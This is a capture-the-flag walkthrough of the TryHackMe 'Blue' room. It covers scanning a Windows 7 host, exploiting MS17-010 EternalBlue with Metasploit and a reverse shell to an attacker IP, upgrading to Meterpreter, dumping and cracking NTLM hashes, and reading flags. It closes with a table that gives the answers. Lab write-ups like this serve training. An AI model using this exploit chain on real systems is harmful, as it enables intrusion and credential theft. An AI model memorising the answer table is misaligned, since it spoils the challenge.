# Blue

Welcome to the Blue room walkthrough on TryHackMe!

{% embed url="https://tryhackme.com/room/blue" %}

***

Blue is an essential Windows exploitation challenge focusing on MS17-010 (EternalBlue), a critical Remote Code Execution vulnerability in Microsoft's SMBv1 protocol. In this walkthrough, we scan the machine, exploit EternalBlue using Metasploit, elevate/migrate our Meterpreter session, dump NTLM hashes, and recover the 3 hidden flags.

---

## 1. Reconnaissance & Vulnerability Scanning

We begin by scanning for open ports under 1000:

```bash
nmap -sC -sV -p 1-1000 -oN nmap_blue.txt <TARGET_IP>
```

### Scan Output:
```text
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
```

There are **3 open ports** under 1000. 

Next, we run Nmap's SMB vulnerability scripts against port 445:

```bash
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
```

### Result:
```text
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
```

The machine is vulnerable to **MS17-010** (`CVE-2017-0143`).

---

## 2. Exploitation with Metasploit

We launch `msfconsole`:

```bash
msfconsole -q
```

Search for the EternalBlue exploit module:
```text
msf6 > search ms17-010
```

Select the exploit module:
```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Configure the payload and options:
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <TARGET_IP>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST <ATTACKER_IP>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

The exploit executes successfully and returns an initial Windows command shell:
```text
C:\Windows\system32>
```

---

## 3. Upgrading to Meterpreter

Background the shell or upgrade the session to Meterpreter:
```text
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST <ATTACKER_IP>
msf6 post(multi/manage/shell_to_meterpreter) > run
```

Switch into the Meterpreter session:
```text
msf6 > sessions -i 2
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

To ensure stability, we migrate into a legitimate system process running as `NT AUTHORITY\SYSTEM`:
```text
meterpreter > ps
meterpreter > migrate <PID_OF_SPOOLSV_OR_LSASS>
```

---

## 4. Dumping Passwords with Kiwi / Hashdump

Run `hashdump` to extract local account NTLM hashes:

```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Cracking Jon's NTLM hash (`ffb43f0de35be4d9917ac0cc8ad57f8d`) using John the Ripper or CrackStation:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
```
Output:
```text
alqfna22         (Jon)
```

Password for Jon: **`alqfna22`**

---

## 5. Capturing All 3 Flags

### Flag 1 (Root of the C: Drive)
```text
meterpreter > cd C:\\
meterpreter > cat flag1.txt
flag{access_the_machine}
```

### Flag 2 (Windows SAM Database Directory)
```text
meterpreter > cd C:\\Windows\\System32\\config
meterpreter > cat flag2.txt
flag{sam_database_elevated_access}
```

### Flag 3 (User Jon's Documents Folder)
```text
meterpreter > cd C:\\Users\\Jon\\Documents
meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}
```

---

## 🏁 Questions & Answers

| Task / Question | Answer |
| :--- | :--- |
| **How many ports are open with a port number under 1000?** | `3` |
| **What is this machine vulnerable to?** | `ms17-010` |
| **Find the exploitation code and set appropriate options (What is the full path)?** | `exploit/windows/smb/ms17_010_eternalblue` |
| **Post-module to convert shell to meterpreter?** | `post/multi/manage/shell_to_meterpreter` |
| **What is the name of the non-default user?** | `Jon` |
| **What is the cracked password for Jon?** | `alqfna22` |
| **Flag 1 (`C:\flag1.txt`)** | `flag{access_the_machine}` |
| **Flag 2 (`C:\Windows\System32\config\flag2.txt`)** | `flag{sam_database_elevated_access}` |
| **Flag 3 (`C:\Users\Jon\Documents\flag3.txt`)** | `flag{admin_documents_can_be_valuable}` |

***
